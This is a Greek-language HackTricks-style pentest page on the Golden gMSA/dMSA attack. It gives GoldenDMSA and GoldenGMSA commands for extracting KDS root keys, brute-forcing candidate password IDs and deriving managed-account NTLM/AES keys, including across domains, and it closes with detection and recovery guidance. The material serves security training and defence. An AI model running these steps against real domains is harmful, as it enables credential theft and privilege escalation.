# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι Windows Managed Service Accounts είναι principals του domain που προορίζονται για την εκτέλεση services χωρίς ο administrator να διαχειρίζεται έναν password μεγάλης διάρκειας:

1. Το **gMSA** (group Managed Service Account) μπορεί να χρησιμοποιηθεί από τους υπολογιστές που είναι εξουσιοδοτημένοι μέσω των `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword`.
2. Το **dMSA** (delegated Managed Service Account) εισήχθη στο **Windows Server 2025**. Συνδέει την κανονική authentication με εξουσιοδοτημένες machine identities και μπορεί να αντικαταστήσει έναν legacy service account μέσω workflow migration.

Μην συγχέετε το **Golden dMSA** με το **BadSuccessor**. Το Golden dMSA απαιτεί compromise του KDS root-key material και κάνει derive τα managed-account keys· το [BadSuccessor](badsuccessor-dmsa-migration-abuse.md), αντίθετα, κάνει abuse τον έλεγχο ενός dMSA object και των migration attributes του.

Ένας DC δεν αποθηκεύει έναν ανεξάρτητα παραγόμενο clear-text password για κάθε gMSA. Παράγει το account password από ένα **KDS root key**, ένα time-indexed Group Key Distribution Protocol (GKDI) key και το account SID. Τα root-key objects είναι objects `msKds-ProvRootKey` κάτω από το `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,...`· η ευαίσθητη τιμή είναι το `msKds-RootKeyData`. Το `msDS-ManagedPasswordId` **δεν είναι GUID**: είναι ένα binary key identifier που περιέχει το GUID του KDS root-key, τα `L0`/`L1`/`L2` indexes του GKDI και metadata του domain/forest. Ο DC εφαρμόζει το KDF με το label `GMSA PASSWORD` και το binary SID ως context και, στη συνέχεια, εκθέτει ένα `MSDS-MANAGEDPASSWORD_BLOB` μόνο σε principals που είναι εξουσιοδοτημένοι να ανακτούν gMSA password.<sup>[[2]](#references)</sup>

Ένα dMSA συνήθως διαφέρει operationally: το secret του προορίζεται να παραμένει στον DC και το KDC εκδίδει credentials σε ένα εξουσιοδοτημένο machine. Ωστόσο, τα dMSA επαναχρησιμοποιούν το υποκείμενο KDS/GKDI password derivation. Το Golden dMSA ανακατασκευάζει απευθείας αυτό το secret και, επομένως, παρακάμπτει το προβλεπόμενο machine-bound flow και το Credential Guard στο service host.<sup>[[1]](#references)</sup>

## Golden gMSA / Golden dMSA Attack

Μετά την εξαγωγή ενός KDS root key, ένας attacker μπορεί να κάνει derive password για accounts που συνδέονται με αυτό το key χωρίς να διαβάσει το `msDS-ManagedPassword`. Αυτό παρακάμπτει το per-account password-retrieval ACL και παραμένει αποτελεσματικό μετά από συνηθισμένα managed-password rotations όσο το compromised root key συνεχίζει να χρησιμοποιείται. Για τα gMSA, το αναγνώσιμο `msDS-ManagedPasswordId` παρέχει συνήθως το ακριβές key identifier. Για dMSA με ACL restrictions, το Golden dMSA περιορίζει το missing identifier σε μόνο **1.024 candidates**.<sup>[[1]](#references)[[2]](#references)</sup>

### Προαπαιτούμενα

* Το σχετικό KDS root-key object, το οποίο συνήθως αποκτάται με δικαιώματα Enterprise Admin / forest-root Domain Admin, με `SYSTEM` σε έναν DC ή από exposed DC database ή backup.<sup>[[1]](#references)[[2]](#references)</sup>
* Το SID του target account, το DNS domain, το όνομα του forest και το `sAMAccountName`.<sup>[[1]](#references)[[2]](#references)</sup>
* Για direct gMSA computation, το base64-encoded `msDS-ManagedPasswordId` του· για Golden dMSA μπορεί, αντί γι’ αυτό, να γίνει guess.<sup>[[1]](#references)[[2]](#references)</sup>
* Ένα x64 Windows host με .NET Framework 4.7.2 για το [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA).<sup>[[3]](#references)</sup>

### Phase 1 - Εξαγωγή του KDS root key

Τα `GoldenDMSA` και [`GoldenGMSA`](https://github.com/Semperis/GoldenGMSA) κάνουν export τα root-key object fields ως base64 blob. Χωρίς όρισμα domain, τα tools κάνουν query στο forest root και απαιτούν κατάλληλη privileged directory access. Με το όρισμα domain/forest, το `SYSTEM` σε έναν DC μπορεί να κάνει query στο local Configuration naming-context replica αυτού του DC.<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
:: GoldenDMSA: Enterprise Admin, or SYSTEM on a DC with --domain
GoldendMSA.exe kds
GoldendMSA.exe kds -g KDS_ROOT_KEY_GUID
GoldendMSA.exe kds --domain child.example.local

:: GoldenGMSA equivalents
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe kdsinfo --guid KDS_ROOT_KEY_GUID
```
Καταγράψτε τόσο το root-key GUID όσο και το base64 root-key blob. Η εξαγωγή των registry `SECURITY`/`SYSTEM` hive δεν αποτελεί από μόνη της το KDS root key: το authoritative υλικό βρίσκεται στο AD Configuration partition.<sup>[[1]](#references)[[2]](#references)</sup>

### Φάση 2 - Enumerate αντικείμενα gMSA / dMSA

Για τα gMSA, λάβετε τα `sAMAccountName`, `objectSid` και το binary `msDS-ManagedPasswordId`. Το τελευταίο είναι συνήθως αναγνώσιμο ακόμη και όταν ο caller δεν επιτρέπεται να ανακτήσει το `msDS-ManagedPassword`.<sup>[[2]](#references)</sup>
```powershell
Get-ADServiceAccount -Filter * -Properties objectSid,msDS-ManagedPasswordId |
Select-Object sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo --domain example.local
```
Το προεπιλεγμένο ACL ενός dMSA μπορεί να αποτρέψει την enumeration μέσω LDAP από χρήστες με χαμηλά δικαιώματα. Το `GoldenDMSA info` μπορεί είτε να εκτελέσει query στο LDAP είτε να κάνει enumerate τα υποψήφια RIDs και να επιλύσει τα SIDs μέσω του `LsaLookupSids` πάνω από το `\PIPE\lsarpc`, διακρίνοντας στη συνέχεια τα dMSAs από τους computer accounts και τα gMSAs.<sup>[[1]](#references)[[3]](#references)</sup>
```cmd
GoldendMSA.exe info -d example.local -m ldap
GoldendMSA.exe info -d example.local -m brute -u alice -p PASSWORD -o EXAMPLE -r 5000
```
### Φάση 3 - Ανακατασκευή ή εικασία του `msDS-ManagedPasswordId`

Το key identifier περιλαμβάνει τα `L0Index`, `L1Index` και `L2Index`, και όχι ένα timestamp δημιουργίας λογαριασμού ακολουθούμενο από τυχαία bits. Η Semperis διαπίστωσε ότι η διαδικασία password-generation δεν χρησιμοποιεί το υποψήφιο `L0Index`, ενώ τα `L1Index` και `L2Index` περιορίζονται το καθένα στις τιμές `0..31`. Κατά συνέπεια, ένας attacker που γνωρίζει το root-key GUID, το domain, το forest και το SID μπορεί να κατασκευάσει και τα `32 * 32 = 1,024` υποψήφια identifiers.<sup>[[1]](#references)</sup>
```cmd
:: Write 1,024 base64 ManagedPasswordId candidates to KDS_ROOT_KEY_GUID.txt
GoldendMSA.exe wordlist -s DMSA_SID -d example.local -f example.local -k KDS_ROOT_KEY_GUID

:: Derive and validate candidates; -t caches the successful TGT
GoldendMSA.exe bruteforce -s DMSA_SID -i KDS_ROOT_KEY_GUID -k KDS_ROOT_KEY_BASE64 -d example.local -u svc_dmsa$ -t
```
Οι derivations πραγματοποιούνται offline, αλλά ο εντοπισμός του live candidate συνήθως απαιτεί attempts για authentication. Αυτό μπορεί να προκαλέσει μια burst αποτυχημένων Kerberos pre-authentication ή NTLM validation attempts πριν βρεθεί το έγκυρο key. Για AES Kerberos keys, το managed-account salt που χρησιμοποιεί το tool είναι `UPPERCASE.DNS.DOMAIN` + `host` + το lower-case account UPN χωρίς το τελικό `$` (για παράδειγμα, `EXAMPLE.LOCALhostsvc_dmsa.example.local`).<sup>[[1]](#references)</sup>

### Phase 4 - Υπολογισμός και χρήση του password

Αν είναι γνωστό το ακριβές identifier, υπολόγισε το 256-byte password buffer και μετέτρεψέ το σε NTLM/AES material. Η τιμή base64 που εκτυπώνεται από αυτά τα tools είναι το encoded password buffer, **όχι το ίδιο το LDAP `MSDS-MANAGEDPASSWORD_BLOB`**.<sup>[[2]](#references)[[3]](#references)</sup>
```cmd
GoldendMSA.exe compute -s ACCOUNT_SID -k KDS_ROOT_KEY_BASE64 -d example.local -m MANAGED_PASSWORD_ID_BASE64
GoldendMSA.exe convert -d example.local -u svc_account$ -p BASE64_PASSWORD

GoldenGMSA.exe compute --sid ACCOUNT_SID --kdskey KDS_ROOT_KEY_BASE64 --pwdid MANAGED_PASSWORD_ID_BASE64
```
Το αποτέλεσμα NTLM μπορεί να χρησιμοποιηθεί όπου γίνεται αποδεκτό το NTLM· το κλειδί AES μπορεί να χρησιμοποιηθεί για overpass-the-hash / TGT requests όπου ο managed account χρησιμοποιεί αποκλειστικά AES. Αυτό παρέχει τα privileges, τα SPNs, τη ρύθμιση delegation και την πρόσβαση σε resources του compromised managed service account, χωρίς να προστεθεί το μηχάνημα του attacker στο `PrincipalsAllowedToRetrieveManagedPassword`.<sup>[[1]](#references)[[2]](#references)</sup>

### Κατάχρηση του Configuration-partition μεταξύ domains

Τα αντικείμενα των KDS root keys βρίσκονται στο forest Configuration naming context, το οποίο αναπαράγεται στους DCs των child domains. Κατά συνέπεια, το `SYSTEM` σε έναν DC child domain μπορεί να διαβάσει το KDS material του forest root από το local replica του child DC, παρότι οι child Domain Admins δεν μπορούν να διαβάσουν απευθείας το αντικείμενο από έναν forest-root DC. Αν ο attacker μπορεί επίσης να διαβάσει το `msDS-ManagedPasswordId` ενός gMSA του parent domain, το GoldenGMSA μπορεί να υπολογίσει το password αυτού του parent account· το SID filtering δεν αποτρέπει αυτήν την cryptographic επίθεση.<sup>[[5]](#references)</sup>
```cmd
:: Run as SYSTEM on a child.example.local DC
GoldenGMSA.exe kdsinfo --forest child.example.local

:: Query target metadata in the parent, then combine both inputs
GoldenGMSA.exe gmsainfo --domain example.local
GoldenGMSA.exe compute --sid PARENT_GMSA_SID --domain example.local --forest child.example.local
```
## Εντοπισμός, Περιορισμός και Ανάκαμψη

* Ρυθμίστε ένα SACL στο container **Master Root Keys**, με inheritance στα αντικείμενα `msKds-ProvRootKey`, για επιτυχείς αναγνώσεις του `msKds-RootKeyData`. Με ενεργοποιημένο το auditing του Directory Service Access, ένα online extraction δημιουργεί το Security event **4662**· διερευνήστε subjects που δεν είναι αναμενόμενοι DCs ή Tier-0 operators. Κάντε επίσης audit στις αλλαγές αυτών των SACLs και των ACLs των root-key objects.<sup>[[1]](#references)[[2]](#references)[[4]](#references)</sup>
* Μια child-to-parent attack διαβάζει το KDS object από το local replica του compromised child DC, επομένως το forest-root domain ενδέχεται να μην παρατηρήσει αυτή την ανάγνωση. Στο parent domain, κάντε audit στις επιτυχείς αναγνώσεις του `msDS-ManagedPasswordId` (schema GUID `0e78295a-c6d3-0a40-b491-d62251ffa0a6`) σε αντικείμενα `msDS-GroupManagedServiceAccount` και διερευνήστε αναγνώσεις από principals άλλου domain.<sup>[[5]](#references)</sup>
* Συσχετίστε την πρόσβαση σε KDS objects με ασυνήθιστα logons από managed accounts και με εξάρσεις αποτυχημένων Kerberos/NTLM authentication attempts για service accounts με κατάληξη `$`. Το offline computation μετά από προηγούμενη κλοπή database/backup δεν είναι ορατό σε ένα live DC.<sup>[[1]](#references)[[3]](#references)</sup>
* Η συνηθισμένη password rotation δεν επαρκεί μετά από έκθεση root key. Η τρέχουσα διαδικασία recovery της Microsoft δημιουργεί ένα νέο KDS root key, κάνει restart το KDS σε όλους τους σχετικούς DCs και μετακινεί τους επηρεαζόμενους λογαριασμούς σε αυτό το key. Αν το scope/χρονικό διάστημα της έκθεσης είναι άγνωστο και η αναμονή για ένα safe roll είναι μη αποδεκτή, αντικαταστήστε κάθε gMSA που χρησιμοποίησε το compromised key· αν το scope είναι γνωστό, η Microsoft τεκμηριώνει ένα authoritative-restore workflow για την επιβολή ασφαλούς rolling. Επικυρώστε το νέο key GUID στο `msDS-ManagedPasswordId` πριν διαγράψετε το παλιό key.<sup>[[4]](#references)</sup>
* Αντιμετωπίστε την πρόσβαση σε DC database και backups, το Configuration-partition replication και τη διαχείριση KDS root keys ως Tier-0. Η μείωση του `ManagedPasswordIntervalInDays` περιορίζει ορισμένα recovery windows, αλλά δεν ανακαλεί ένα root key που έχει ήδη παραβιαστεί.<sup>[[4]](#references)</sup>

## Εργαλεία

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) - enumeration dMSA/gMSA, generation identifiers, validation 1.024 candidates, password computation και NTLM/AES conversion.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) - gMSA/KDS enumeration και online, offline και cross-domain password computation.<sup>[[2]](#references)</sup>
* [`Rubeus`](https://github.com/GhostPack/Rubeus) και [`Impacket`](https://github.com/fortra/impacket) - χρησιμοποιήστε ή επικυρώστε τα derived NTLM/AES keys σε authorised testing.



## References

- [1] [Golden dMSA - authentication bypass για delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [4] [Microsoft - Πώς να κάνετε recovery από μια Golden gMSA attack](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)
- [5] [SID filter ως security boundary μεταξύ domains; Part 5 - Golden gMSA trust attack](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
{{#include ../../banners/hacktricks-training.md}}
